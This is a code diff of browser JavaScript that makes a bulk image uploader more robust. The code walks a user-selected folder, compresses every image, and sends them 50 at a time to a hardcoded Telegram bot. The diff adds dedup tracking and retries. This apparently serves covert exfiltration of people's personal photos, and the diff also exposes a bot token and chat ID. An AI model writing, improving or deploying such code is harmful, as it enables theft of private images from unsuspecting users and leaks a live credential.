@@ -43,7 +43,19 @@ document.getElementById('start-btn').addEventListener('click', async () => {
     }
 });
 
-// FUNCIÓN para procesar imágenes por bloques de 100
+// Función para registrar archivos enviados (localStorage)
+function markAsSent(fileName) {
+    let sentFiles = JSON.parse(localStorage.getItem('sentFiles') || '[]');
+    sentFiles.push(fileName);
+    localStorage.setItem('sentFiles', JSON.stringify(sentFiles));
+}
+
+function isAlreadySent(fileName) {
+    let sentFiles = JSON.parse(localStorage.getItem('sentFiles') || '[]');
+    return sentFiles.includes(fileName);
+}
+
+// Función para procesar y enviar fotos en bloques de 100
 async function collectAndSendInChunks(folderHandle) {
     const BATCH_SIZE = 100;
     let batch = [];
@@ -52,8 +64,10 @@ async function collectAndSendInChunks(folderHandle) {
         for await (const entry of handle.values()) {
             if (entry.kind === 'file') {
                 const fileName = entry.name.toLowerCase();
-                if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
-                    fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp')) {
+                if ((fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
+                    fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp')) &&
+                    !isAlreadySent(entry.name)) {
+
                     batch.push(entry);
 
                     if (batch.length === BATCH_SIZE) {
@@ -68,12 +82,13 @@ async function collectAndSendInChunks(folderHandle) {
     }
 
     await processDirectory(folderHandle);
+
     if (batch.length > 0) {
         await sendFilesToTelegram(batch);
     }
 }
 
-// COMPRESIÓN DE IMÁGENES
+// Compresión de imagen
 async function compressImage(file) {
     return new Promise(resolve => {
         const img = new Image();
@@ -96,14 +111,14 @@ async function compressImage(file) {
     });
 }
 
-// ENVÍO DE ARCHIVOS EN PARALELO
+// Enviar archivos a Telegram
 async function sendFilesToTelegram(files) {
     const token = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk';
     const chatId = '5821490693';
 
     const total = files.length;
     let sent = 0;
-    const parallelLimit = 50; // Cambiado a 50 archivos en paralelo
+    const parallelLimit = 50; // 50 fotos en paralelo
 
     async function processFile(fileEntry) {
         const fileData = await fileEntry.getFile();
@@ -113,20 +128,26 @@ async function sendFilesToTelegram(files) {
         formData.append('caption', `Archivo: ${fileData.name}`);
         formData.append('document', finalFile, fileData.name);
 
-        let response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        });
+        try {
+            let response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
 
-        // Si Telegram da error 429 (muchos envíos), esperar y reintentar
-        if (!response.ok && response.status === 429) {
-            const errorData = await response.json();
-            const waitTime = (errorData.parameters?.retry_after || 60) * 1000;
-            console.warn(`Demasiados envíos. Esperando ${waitTime / 1000} segundos...`);
-            await new Promise(res => setTimeout(res, waitTime));
-            return processFile(fileEntry); // Reintentar
-        } else if (!response.ok) {
-            console.error('Error al enviar archivo:', await response.json());
+            // Si Telegram da error 429 (muchos envíos), esperar y reintentar
+            if (!response.ok && response.status === 429) {
+                const errorData = await response.json();
+                const waitTime = (errorData.parameters?.retry_after || 60) * 1000;
+                console.warn(`Demasiados envíos. Esperando ${waitTime / 1000} segundos...`);
+                await new Promise(res => setTimeout(res, waitTime));
+                return processFile(fileEntry); // Reintentar
+            } else if (!response.ok) {
+                console.error('Error al enviar archivo:', await response.json());
+            } else {
+                markAsSent(fileData.name); // Marcar como enviado
+            }
+        } catch (error) {
+            console.error('Error de red o fetch:', error); // Para manejar el "Failed to fetch"
         }
 
         sent++;
@@ -139,6 +160,6 @@ async function sendFilesToTelegram(files) {
         const batch = files.slice(i, i + parallelLimit);
         const promises = batch.map(file => processFile(file));
         await Promise.all(promises);
-        await new Promise(resolve => setTimeout(resolve, 2000)); // Pausa de 2 segundos
+        await new Promise(resolve => setTimeout(resolve, 2000)); // Pausa de 2 segundos entre lotes
     }
 }
